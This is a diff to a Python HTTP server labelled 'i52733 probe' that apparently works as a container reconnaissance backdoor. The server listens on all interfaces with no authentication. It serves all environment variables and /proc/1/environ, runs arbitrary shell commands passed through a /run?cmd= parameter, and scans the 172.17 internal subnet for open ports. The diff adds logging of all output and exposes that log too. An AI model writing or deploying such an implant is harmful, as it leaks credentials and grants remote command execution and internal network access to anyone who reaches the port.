@@ -12,6 +12,33 @@ def safe(fn, default=None):
 def read_file(p, n=40000):
     return safe(lambda: open(p, 'rb').read()[:n].decode('utf-8', 'replace'))
 
+LOG_BUF = []
+
+def _log(msg):
+    LOG_BUF.append("%s %s" % (time.strftime('%H:%M:%S'), str(msg)[:400]))
+    if len(LOG_BUF) > 400:
+        del LOG_BUF[:200]
+    print(str(msg)[:400], flush=True)
+
+class _Wr:
+    def __init__(self, tag):
+        self.tag = tag
+        self.b = b''
+    def write(self, s):
+        self.b += s
+        while b'\n' in self.b:
+            line, self.b = self.b.split(b'\n', 1)
+            _log(self.tag + ' ' + line.decode('utf-8', 'replace'))
+        return len(s)
+    def flush(self):
+        pass
+    def isatty(self):
+        return False
+
+import sys
+sys.stdout = _Wr('stdout:')
+sys.stderr = _Wr('stderr:')
+
 def tcp_probe(host, port, timeout=4):
     def go():
         s = socket.create_connection((host, port), timeout=timeout)
@@ -113,7 +140,8 @@ class H(http.server.BaseHTTPRequestHandler):
                         "self_postgres_127": tcp_probe("127.0.0.1", 5432, 3),
                     }
                 out = {
-                    "note": "i52733 v2",
+                    "note": "i52733 v3",
+                    "server_log": "\n".join(LOG_BUF[-120:]),
                     "env": dict(os.environ),
                     "proc1_environ": read_file("/proc/1/environ"),
                     "proc1_cmdline": read_file("/proc/1/cmdline"),
@@ -145,7 +173,7 @@ class H(http.server.BaseHTTPRequestHandler):
                 out = safe(lambda: subprocess.run(["sh", "-c", cmd], capture_output=True, timeout=10))
                 b = ((out.stdout or b"") + (out.stderr or b""))[:12000]
             else:
-                b = b"I52733 v2 OK. GET /env GET /run?cmd=... GET /scan?base=172.17&ports=3000,5432"
+                b = b"I52733 v3 OK. GET /env GET /run?cmd=... GET /scan?base=172.17&ports=3000,5432"
             self.send_response(200)
             self.send_header("Content-Type", "text/plain")
             self.send_header("Content-Length", str(len(b)))
@@ -159,20 +187,17 @@ class H(http.server.BaseHTTPRequestHandler):
 
 if __name__ == "__main__":
     ports = set()
-    for k in ("PORT",):
-        v = os.environ.get(k)
-        if v and v.isdigit():
-            ports.add(int(v))
+    v = os.environ.get("PORT")
+    if v and v.isdigit():
+        ports.add(int(v))
     ports.update({3000, 8080})
-    print("i52733 probe v3 listening on", sorted(ports), flush=True)
-    servers = []
-    for p in ports:
+    _log("listening on %s envPORT=%s" % (sorted(ports), os.environ.get("PORT")))
+    for p in sorted(ports):
         try:
             srv = http.server.ThreadingHTTPServer(("0.0.0.0", p), H)
             threading.Thread(target=srv.serve_forever, daemon=True).start()
-            servers.append((p, srv))
-            print("bound", p, flush=True)
+            _log("bound %d" % p)
         except Exception as e:
-            print("bind fail", p, e, flush=True)
+            _log("bind fail %d: %r" % (p, e))
     while True:
         time.sleep(3600)
